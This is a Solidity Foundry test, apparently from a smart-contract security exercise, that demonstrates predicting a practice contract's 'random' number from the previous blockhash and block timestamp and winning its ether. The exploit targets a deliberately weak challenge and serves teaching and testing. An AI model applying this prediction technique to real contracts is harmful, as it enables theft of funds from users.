
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        vm.assume(blockNumber > 1);
        vm.assume(blockNumber < type(uint256).max - 1);
        vm.assume(blockTimestamp > 0);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        bytes32 prevHash = blockhash(block.number - 1);
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(prevHash, block.timestamp))));

        vm.deal(address(this), address(this).balance + 1 ether);
        challenge.guess{value: 1 ether}(predictedAnswer);

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}

    fallback() external payable {}
}
